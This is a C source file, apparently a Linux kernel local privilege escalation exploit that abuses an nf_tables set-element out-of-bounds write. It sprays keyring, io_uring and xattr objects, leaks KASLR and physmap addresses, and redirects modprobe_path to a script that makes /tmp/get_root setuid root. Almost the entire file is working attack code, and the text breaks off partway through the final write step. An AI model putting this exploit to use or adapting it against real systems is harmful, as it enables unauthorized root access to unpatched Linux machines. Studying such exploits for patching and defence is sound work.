// $ gcc -no-pie -static -pthread ./exploit.c -o ./exploit
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <linux/keyctl.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <sys/types.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <semaphore.h>
#include <sched.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/utsname.h>
#include <sys/syscall.h>
#include <linux/io_uring.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

void error(char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

// ---------------------------------- util --------------------------------------
#define FILENAME_MAX_LEN 0x80

// write_file(): Write a string into a file
void write_file(const char *filename, char *text) {
    int fd = open(filename, O_RDWR);
    write(fd, text, strlen(text));
    close(fd);
}

// new_ns(): Change the current namespace to access to netfilter and to be able to write security xattr in a tmpfs
void new_ns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buffer[0x100];

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS))
        error("unshare(CLONE_NEWUSER | CLONE_NEWNS)");

    if (unshare(CLONE_NEWNET))
        error("unshare(CLONE_NEWNET)");
    
    write_file("/proc/self/setgroups", "deny");

    snprintf(buffer, sizeof(buffer), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buffer);
    snprintf(buffer, sizeof(buffer), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buffer);
}

// set_cpu_affinity(): Pin a process to a CPU
void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0)
        error("sched_setaffinity");
}

// ---------------------------------- uring --------------------------------------
#define SPRAY_NB_ENTRIES 10

struct fd_uring {
    int fd;
    struct io_uring_params *params;
};

static inline int io_uring_setup(uint32_t entries, struct io_uring_params *p) {
    return syscall(__NR_io_uring_setup, entries, p);
}

static inline int io_uring_register(int fd, unsigned int opcode, void *arg, unsigned int nr_args) {
    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

// spray_uring(): Spray 300 percpu_ref_data in kmalloc-64
void spray_uring(uint32_t spray_size, struct fd_uring *fd_buffer) {
    for (uint64_t i = 0; i < spray_size; i++) {
        fd_buffer[i].params = malloc(sizeof(struct io_uring_params));
        if (!fd_buffer[i].params)
            error("malloc");
        memset(fd_buffer[i].params, 0, sizeof(struct io_uring_params));

        fd_buffer[i].fd = io_uring_setup(SPRAY_NB_ENTRIES, fd_buffer[i].params);
        if (fd_buffer[i].fd < 0)
            error("io_uring_create");
    }
}

// release_uring(): Release percpu_ref_data
void release_uring(struct fd_uring *fd_buffer, uint32_t spray_size) {
    for (uint32_t i = 0; i < spray_size; i++) 
        close(fd_buffer[i].fd);
    free(fd_buffer);
}

// ---------------------------------- simple_xattr --------------------------------------
#define XATTR_FILE "/tmp/tmpfs/a"
#define XATTR_VALUE "value"
#define XATTR_DELETION_NAME "security.Iwanttoberoot"

#define ATTRIBUTE_NAME_LEN 0x100
#define COMMAND_MAX_LEN 0x100
#define PREFIX_BUFFER_LEN 16

struct write4_payload {
    uint8_t prefix[PREFIX_BUFFER_LEN];
    void *next;
    void *prev;
    uint8_t name_offset;
} __attribute__((packed));

// create_xattr(): Add an xattribute to a file with the value "value"
void create_xattr(const char *filename, char *attribute_name) {
    if (setxattr(filename, attribute_name, XATTR_VALUE, strlen(XATTR_VALUE), XATTR_CREATE) < 0)
        error("setxattr");
}

// spray_simple_xattr(): Spray 300 simple_xattr
void spray_simple_xattr(char *filename, uint32_t spray_size) {
    char command[COMMAND_MAX_LEN];
    char attribute_name[ATTRIBUTE_NAME_LEN];

// 1. Mount a new tmpfs to be able to set security xattr
    if (mkdir("/tmp/tmpfs", S_IRWXU) == -1 && errno != EEXIST)
		error("mkdir");

    system("mount -t tmpfs none /tmp/tmpfs");
    
// 2. Create a file to the set attributes
    int fd = creat(filename, 0644);
    close(fd);
// 3. spray simple_xattr
    for (uint64_t i = 0; i < spray_size; i++) {
        // Need that the name is allocated within `kmalloc-256`
        snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%215lu-%s", i, XATTR_DELETION_NAME);
        create_xattr(filename, attribute_name);
    }
}

// ---------------------------------- keyring --------------------------------------
#define IO_RING_CTX_REF_FREE_OFFSET 0xc4235d        // ?????????  ffffffff81c4235d t io_ring_ctx_ref_free
#define IO_RSRC_NODE_REF_ZERO_OFFSET 0xc42517       // ?????????  ffffffff81c42517 t io_rsrc_node_ref_zero

#define KEY_DESC_MAX_SIZE 40
#define PREFIX_BUF_LEN 16
#define RCU_HEAD_LEN 16
#define SPRAY_KEY_SIZE 50

#define PHYSMAP_MASK 0xffffffff00000000

struct keyring_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];  // pad - user_key_payload->rcu
    unsigned short len;             // forge user_key_payload->datalen
};

struct leak {
    long kaslr_base;
    long physmap_base;
};

typedef int32_t key_serial_t;

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}
// spray_keyring(): Spray 50 user_key_payload
// Return: Allocated buffer with serial numbers of the created keys
key_serial_t *spray_keyring(uint32_t spray_size) {
    char key_desc[KEY_DESC_MAX_SIZE];
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        error("calloc");

    for (uint32_t i = 0; i < spray_size; i++) {
        snprintf(key_desc, KEY_DESC_MAX_SIZE, "RandoriSec-%03du", i);
        id_buffer[i] = add_key("user", key_desc, key_desc, strlen(key_desc), KEY_SPEC_PROCESS_KEYRING);
        if (id_buffer[i] < 0)
            error("add_key");
    }

    return id_buffer;
}

// parse_leak(): find KASLR & physmap addr
// if percpu_ref_data->release == `io_ring_ctx_ref_free()` or `io_rsrc_node_ref_zero()`, we find KASLR
// then get percpu_ref_data->ref (physmap addr)
struct leak *parse_leak(long *buffer, uint32_t buffer_size) {
    struct leak *ret = malloc(sizeof(struct leak));
    if (!ret)
        error("malloc");

    for (uint32_t i = 0; i < buffer_size; i++) {
        // percpu_ref_data->release == io_ring_ctx_ref_free()
        if ((buffer[i] & 0xfffff) == (IO_RING_CTX_REF_FREE_OFFSET & 0xfffff)) {
            ret->kaslr_base = buffer[i] - IO_RING_CTX_REF_FREE_OFFSET;
            ret->physmap_base = buffer[i + 5] & PHYSMAP_MASK;
            return ret;
        }
        // percpu_ref_data->release == io_rsrc_node_ref_zero()
        else if ((buffer[i] & 0xfffff) == (IO_RSRC_NODE_REF_ZERO_OFFSET & 0xfffff)) {
            ret->kaslr_base = buffer[i] - IO_RSRC_NODE_REF_ZERO_OFFSET;
            ret->physmap_base = buffer[i + 5] & PHYSMAP_MASK;
            return ret;
        }
    }

    free(ret);
    return NULL;
}

void print_hex( char *buf,int size){
    int i;
    puts("======================================");
    printf("data :\n");
    for (i=0 ; i<(size/8);i++){
        if (i%2 == 0){
            printf("%d",i/2);
        }
        printf(" %16llx",*(size_t * )(buf + i*8));
        if (i%2 == 1){
            printf("\n");
        }       
    }
    puts("======================================");
}

// get_keyring_leak(): leak KASLR & physmap —— Search for a key with an unexpected size to find the corrupted object.
struct leak *get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    uint8_t buffer[USHRT_MAX] = {0};
    int32_t keylen;

    for (uint32_t i = 0; i < id_buffer_size; i++) {
        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, USHRT_MAX, 0);
        if (keylen < 0)
            error("keyctl");

        if (keylen == USHRT_MAX)    // ?????????????
        {
            // print_hex(buffer, keylen);
            return parse_leak((long *)buffer, keylen >> 3);
        }
    }
    return NULL;
}

void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    for (uint32_t i = 0; i < id_buffer_size; i++) 
        if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) < 0)
            error("keyctl(KEYCTL_REVOKE)");

    free(id_buffer);
}

// ---------------------------------- modprobe --------------------------------------
const char dummy_file[] = "/tmp/dummy\0";
const char dummy_content[] = "\xff\xff\xff\xff";
const char new_modprobe_content[] = "#!/bin/bash\n\nchown root:root /tmp/get_root\nchmod 4555 /tmp/get_root\n";

sem_t *shell_barrier;

// prepare_root_shell(): Setup a second process waiting out the namespaces used for the exploit
void prepare_root_shell(void) {
    int shmid = shmget(0x1337, sizeof(sem_t), IPC_CREAT | S_IRWXU | S_IRWXG | S_IRWXO);
    shell_barrier = shmat(shmid, NULL, 0);

    if (sem_init(shell_barrier, 1, 0) < 0)
        error("sem_init");

    if (!fork()) {
        system("cp get_root /tmp");
        sem_wait(shell_barrier);
        system("/tmp/get_root");
        exit(EXIT_SUCCESS);
    }
}

// create_dummy_file(): Create a file to trigger call_modprobe in case of execution
void create_dummy_file(void) {
    int fd;
    fd = open(dummy_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    write(fd, dummy_content, sizeof(dummy_content));
    close(fd);
}

// get_new_modprobe_path(): Read the new modprobe_path (read it from /proc/sys/kernel/modprobe)
char *get_new_modprobe_path(void) {
    int fd;
    char *modprobe_path = malloc(15);
    if (!modprobe_path)
        error("malloc");

    fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0)
        error("open(/proc/sys/kernel/modprobe)");

    read(fd, modprobe_path, 14);
    close(fd);

    modprobe_path[14] = '\0';
    return modprobe_path;
}

// write_new_modprobe(): Create chown && chmod script for get_root
// @filename: current modprobe path
void write_new_modprobe(char *filename) {
    int fd;
    fd = open(filename, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    if (fd < 0)
        error("open");

    write(fd, new_modprobe_content, sizeof(new_modprobe_content));
    close(fd);
}

// setup_modprobe_payload(): Prepare all the needed stuff to get a root shell
void setup_modprobe_payload(void) {
    char *filename;
    filename = get_new_modprobe_path();

    write_new_modprobe(filename);
    create_dummy_file();

    free(filename);
}

// get_root_shell(): Trigger a call to the new modprobe_path
void get_root_shell(void) {
	int pid = fork();
	if (pid == 0)
		execve("/tmp/dummy", NULL, NULL);
	
	waitpid(pid, NULL, 0);
    sem_post(shell_barrier);
}

// ---------------------------------- netlink --------------------------------------
// Netlink messages 
#define NETLINK_RECEIVE_BUFFER_SIZE 4096

// Netlink attributes 
#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)
#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + S8_NLA_SIZE)

// get_batch_begin_nlmsg(): Construct a BATCH_BEGIN message for the netfilter netlink
struct nlmsghdr *get_batch_begin_nlmsg(void) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
    struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);
    if (!nlh)
        error("malloc");

    memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
    nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_seq = 0;

// Used to access to the netfilter tables subsystem
    nfgm->res_id = NFNL_SUBSYS_NFTABLES;

    return nlh;
}

// get_batch_end_nlmsg(): Construct a BATCH_END message for the netfilter netlink
struct nlmsghdr *get_batch_end_nlmsg(void) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
    if (!nlh)
        error("malloc");

    memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
    nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = NFNL_MSG_BATCH_END;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    return nlh;
}

// set_nested_attr(): Prepare a nested netlink attribute
struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type, uint16_t data_len) {
    attr->nla_type = type;
    attr->nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
    return (void *)attr + sizeof(struct nlattr);
}

// set_u32_attr(): Prepare an integer netlink attribute
struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t value) {
    attr->nla_type = type;
    attr->nla_len = U32_NLA_SIZE;
    *(uint32_t *)NLA_ATTR(attr) = htonl(value);

    return (void *)attr + U32_NLA_SIZE;
}

// set_u64_attr(): Prepare a 64 bits integer netlink attribute
struct nlattr *set_u64_attr(struct nlattr *attr, uint16_t type, uint64_t value) {
    attr->nla_type = type;
    attr->nla_len = U64_NLA_SIZE;
    *(uint64_t *)NLA_ATTR(attr) = htobe64(value);

    return (void *)attr + U64_NLA_SIZE;
}

// set_str8_attr(): Prepare a 8 bytes long string netlink attribute
// @name: Buffer to copy into the attribute
struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const char name[8]) {
    attr->nla_type = type;
    attr->nla_len = S8_NLA_SIZE;
    memcpy(NLA_ATTR(attr), name, 8);

    return (void *)attr + S8_NLA_SIZE;
}

// set_binary_attr(): Prepare a byte array netlink attribute
// @buffer: Buffer with data to send
// @buffer_size: Size of the previous buffer
struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type, uint8_t *buffer, uint64_t buffer_size) {
    attr->nla_type = type;
    attr->nla_len = NLA_BIN_SIZE(buffer_size);
    memcpy(NLA_ATTR(attr), buffer, buffer_size);

    return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
}

// ---------------------------------- nf_tables --------------------------------------
#define KMALLOC64_KEYLEN (64 - 8 - 12 - 16) // Max size - elemsize - sizeof(nft_set_ext)(align) - min datasize

const uint8_t zerobuf[0x40] = {0};

// create_table(): Register a new table for the inet family
void create_table(int sock, const char *name) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh;
    struct nlmsghdr *nlh_batch_end;
    struct nlattr *attr;
    struct nfgenmsg *nfm;

// Destination preparation
    memset(&dest_snl, 0, sizeof(dest_snl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

// 1. Netlink batch_begin message preparation
    nlh_batch_begin = get_batch_begin_nlmsg();

// 2. Netlink table message preparation
    nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
    if (!nlh)
        error("malloc");

    memset(nlh, 0, TABLEMSG_SIZE);
    nlh->nlmsg_len = TABLEMSG_SIZE;
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    nfm = NLMSG_DATA(nlh);
    nfm->nfgen_family = NFPROTO_INET;

    // Prepare associated attribute
    attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
    set_str8_attr(attr, NFTA_TABLE_NAME, name);

// 3. Netlink batch_end message preparation 
    nlh_batch_end = get_batch_end_nlmsg();

    // IOV preparation
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh;
    iov[1].iov_len = nlh->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    // Message header preparation 
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    sendmsg(sock, &msg, 0);

    // Free used structures
    free(nlh_batch_end);
    free(nlh);
    free(nlh_batch_begin);
}

/* create_set(): Create a netfilter set
 * @sock: Socket used to communicate throught the netfilter netlink
 * @set_name: Name of the created set
 * @set_keylen: Length of the keys of this set. Used in the exploit to control the used cache
 * @data_len: Length of stored data. Used to control the size of the overflow
 * @table_name: Name of the table that stores this set
 * @id: ID of the created set */
void create_set(int sock, const char *set_name, uint32_t set_keylen, uint32_t data_len, const char *table_name, uint32_t id) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_payload;
    struct nlmsghdr *nlh_batch_end;
    struct nfgenmsg *nfm;
    struct nlattr *attr;
    uint64_t nlh_payload_size;
    struct iovec iov[3];

    // Prepare the netlink sockaddr for msg
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

// 1. First netlink message: batch_begin */
    nlh_batch_begin = get_batch_begin_nlmsg();

// 2. Second netlink message : Set attributes */
    nlh_payload_size = sizeof(struct nfgenmsg);     // Mandatory
    nlh_payload_size += S8_NLA_SIZE;                // NFTA_SET_TABLE
    nlh_payload_size += S8_NLA_SIZE;                // NFTA_SET_NAME
    nlh_payload_size += U32_NLA_SIZE;               // NFTA_SET_ID
    nlh_payload_size += U32_NLA_SIZE;               // NFTA_SET_KEY_LEN
    nlh_payload_size += U32_NLA_SIZE;               // NFTA_SET_FLAGS
    nlh_payload_size += U32_NLA_SIZE;               // NFTA_SET_DATA_TYPE
    nlh_payload_size += U32_NLA_SIZE;               // NFTA_SET_DATA_LEN
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

    // Allocation
    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh_payload)
        error("malloc");

    memset(nlh_payload, 0, nlh_payload_size);

    // Fill the required fields
    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
    nlh_payload->nlmsg_pid = getpid();
    nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh_payload->nlmsg_seq = 0;
    
    // Setup the nfgenmsg
    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
    nfm->nfgen_family = NFPROTO_INET;

    // Setup the attributes
    attr = (struct nlattr *)((void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg)));
    attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ID, id);
    attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
    attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
    attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
    set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);

// 3. Last netlink message: batch_end 
    nlh_batch_end = get_batch_end_nlmsg();

    // Setup the iovec
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh_payload;
    iov[1].iov_len = nlh_payload->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

// 4. Prepare the message to send
    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    // Send message
    sendmsg(sock, &msg, 0);

    // Free allocated memory
    free(nlh_batch_end);
    free(nlh_payload);
    free(nlh_batch_begin);
}

/* add_elem_to_set(): Trigger OOB
 * @sock: Socket used to communicate throught the netfilter netlink
 * @set_name: Name of the set to add the element
 * @set_keylen: Length of the keys of the previous set
 * @table_name: Table associated to the preiv
 * @id: ID of the previous set
 * @data_len: Length of the data to copy. (= Size of the overflow - 16 )
 * @data: Data used for the overflow
 *
 * Submit two elements to add to the set.
 * The first one is used to setup the data payload
 * The second will trigger the overflow */
void add_elem_to_set(int sock, const char *set_name, uint32_t set_keylen, const char *table_name, uint32_t id, uint32_t data_len, uint8_t *data) {
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct nlmsghdr *nlh_batch_begin;
    struct nlmsghdr *nlh_payload;
    struct nlmsghdr *nlh_batch_end;
    struct nfgenmsg *nfm;
    struct nlattr *attr;
    uint64_t nlh_payload_size;
    uint64_t nested_attr_size;
    size_t first_element_size;
    size_t second_element_size;
    struct iovec iov[3];

    // Prepare the netlink sockaddr for msg
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;

// 1. First netlink message: batch 
    nlh_batch_begin = get_batch_begin_nlmsg();

// 2. Second netlink message : Set attributes 
    // Precompute the size of the nested field
    nested_attr_size = 0;

    // First element
    nested_attr_size += sizeof(struct nlattr);              // Englobing attribute
    nested_attr_size += sizeof(struct nlattr);              // NFTA_SET_ELEM_KEY
    nested_attr_size += NLA_BIN_SIZE(set_keylen);           // NFTA_DATA_VALUE
    nested_attr_size += sizeof(struct nlattr);              // NFTA_SET_ELEM_DATA
    nested_attr_size += NLA_ALIGN(NLA_BIN_SIZE(data_len));  // NFTA_DATA_VALUE
    first_element_size = nested_attr_size;

    // Second element
    nested_attr_size += sizeof(struct nlattr);              // Englobing attribute
    nested_attr_size += sizeof(struct nlattr);              // NFTA_SET_ELEM_KEY
    nested_attr_size += NLA_BIN_SIZE(set_keylen);           // NFTA_DATA_VALUE
    nested_attr_size += sizeof(struct nlattr);              // NFTA_SET_ELEM_DATA
    nested_attr_size += sizeof(struct nlattr);              // NFTA_DATA_VERDICT
    nested_attr_size += U32_NLA_SIZE;                       // NFTA_VERDICT_CODE
    second_element_size = nested_attr_size - first_element_size;

    nlh_payload_size = sizeof(struct nfgenmsg);             // Mandatory
    nlh_payload_size += sizeof(struct nlattr);              // NFTA_SET_ELEM_LIST_ELEMENTS
    nlh_payload_size += nested_attr_size;                   // All the stuff described above
    nlh_payload_size += S8_NLA_SIZE;                        // NFTA_SET_ELEM_LIST_TABLE
    nlh_payload_size += S8_NLA_SIZE;                        // NFTA_SET_ELEM_LIST_SET
    nlh_payload_size += U32_NLA_SIZE;                       // NFTA_SET_ELEM_LIST_SET_ID
    nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

    // Allocation
    nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
    if (!nlh_payload) 
        error("malloc");
    memset(nlh_payload, 0, nlh_payload_size);

    // Fill the required fields
    nlh_payload->nlmsg_len = nlh_payload_size;
    nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSETELEM;
    nlh_payload->nlmsg_pid = getpid();
    nlh_payload->nlmsg_flags = NLM_F_REQUEST;
    nlh_payload->nlmsg_seq = 0;

    // Setup the nfgenmsg
    nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
    nfm->nfgen_family = NFPROTO_INET;

    // Setup the attributes
    attr = (struct nlattr *)((void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg)));
    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
    attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
    attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS, nested_attr_size);

// 2-1 First element
    attr = set_nested_attr(attr, 0, first_element_size - 4);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)zerobuf, set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, NLA_BIN_SIZE(data_len));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)data, data_len);

// 2-2 Second element
    attr = set_nested_attr(attr, 0, second_element_size - 4);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, NLA_BIN_SIZE(set_keylen));
    attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)zerobuf, set_keylen);
    attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE + sizeof(struct nlattr));
    attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
    set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);

// 3. Last netlink message: End of batch 
    nlh_batch_end = get_batch_end_nlmsg();

    // Setup the iovec
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh_batch_begin;
    iov[0].iov_len = nlh_batch_begin->nlmsg_len;
    iov[1].iov_base = (void *)nlh_payload;
    iov[1].iov_len = nlh_payload->nlmsg_len;
    iov[2].iov_base = (void *)nlh_batch_end;
    iov[2].iov_len = nlh_batch_end->nlmsg_len;

    // Prepare the message to send
    memset(&msg, 0, sizeof(struct msghdr));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 3;

    // Send message
    sendmsg(sock, &msg, 0);

    // Free allocated memory
    free(nlh_batch_end);
    free(nlh_payload);
    free(nlh_batch_begin);
}

// ------------------------------------------------------------------------
#define ID 1337
#define SET_NAME "name\0\0\0"
#define LEAK_SET_NAME "leak\0\0\0"
#define TABLE_NAME "table\0\0"

#define MODPROBE_PATH_BASE 0x186e880 // ?????????????  ffffffff8286e880 D modprobe_path

#define SPRAY_SIZE 300

int main(int argc, char **argv) {
    int sock;
    struct sockaddr_nl snl;
    struct write4_payload payload;
    struct keyring_payload leak_payload;
    struct leak *bases;
    struct fd_uring *fd_buffer;
    key_serial_t *id_buffer;
    char xattr_target_filename[] = "/tmp/tmpfs/file0";  // used for xattr spray
// 1. initialize
// 1-1 set affinity
    set_cpu_affinity(0, 0);
// 1-2 start a process wait for getting shell
    prepare_root_shell();
    printf("[+] Second process currently waiting\n");
// 1-3 setup namespace
    new_ns();
    printf("[+] Get CAP_NET_ADMIN capability\n");
// 1-4 Netfilter netlink socket creation
    if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) 
        error("socket");
    printf("[+] Netlink socket created\n");

    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    snl.nl_pid = getpid();
    if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0)
        error("bind");
    printf("[+] Netlink socket bound\n");
// 2. setup nf_tables
// 2-1 Create a netfilter table
    create_table(sock, TABLE_NAME);
    printf("[+] Table %s created\n", TABLE_NAME);

// 2-2 Create a netfilter set for the info leak
    create_set(sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, sizeof(struct keyring_payload), TABLE_NAME, ID);
    printf("[+] Set for the leak created\n");

// 2-3  Create a netfilter set for the write primitive
    create_set(sock, SET_NAME, KMALLOC64_KEYLEN, sizeof(struct write4_payload), TABLE_NAME, ID + 1);
    printf("[+] Set for write primitive created\n");
// 3. leak kernel base
// 3-1 Prepare the payload for the leak */
    int try_num = 0; 
    memset(&leak_payload, 0, sizeof(struct keyring_payload));
    leak_payload.len = USHRT_MAX;

    printf("[*] Leak in process");
    fflush(stdout);
retry:
// 3-2 Spray 50 user_key_payload
    id_buffer = spray_keyring(SPRAY_KEY_SIZE);

// 3-3 trigger OOB to modify user_key_payload->datalen
    add_elem_to_set(sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID, sizeof(struct keyring_payload), (uint8_t *)&leak_payload);

// 3-4 Spray 300 percpu_ref_data in kmalloc-64
    fd_buffer = calloc(SPRAY_SIZE, sizeof(struct fd_uring));    // 300
    if (!fd_buffer)
        error("calloc");
    spray_uring(SPRAY_SIZE, fd_buffer);

// 3-5 leak KASLR & physmap
    bases = get_keyring_leak(id_buffer, SPRAY_KEY_SIZE);
    if (!bases) {
        release_keys(id_buffer, SPRAY_KEY_SIZE);
        release_uring(fd_buffer, SPRAY_SIZE);
        printf("trying %d\n", try_num++);
        goto retry;
    }
    printf("\r[+] Leak succeed     \n");
    printf("[+] kaslr base found 0x%lx\n", bases->kaslr_base);
    printf("[+] physmap base found 0x%lx\n", bases->physmap_base);
// 4. change modprobe_path
// 4-1 Prepare the payload for the write primitive
    memset(&payload, 0, sizeof(struct write4_payload));
    payload.next = (void *)(bases->physmap_base + 0x2f706d74);      // /sbin/modprobe -> /tmp/xxxxprobe
    payload.prev = (void *)(bases->kaslr_base + MODPROBE_PATH_BASE + 1);
    payload.name_offset = 0xe5;             // points to XATTR_DELETION_NAME "security.Iwanttoberoot"

respray_xattr:
// 4-2 Spray 300 simple_xattr
    spray_simple_xattr(xattr_target_filename, SPRAY_SIZE);
// 4-3 trigger OOB to modify simple_xattr->list_head
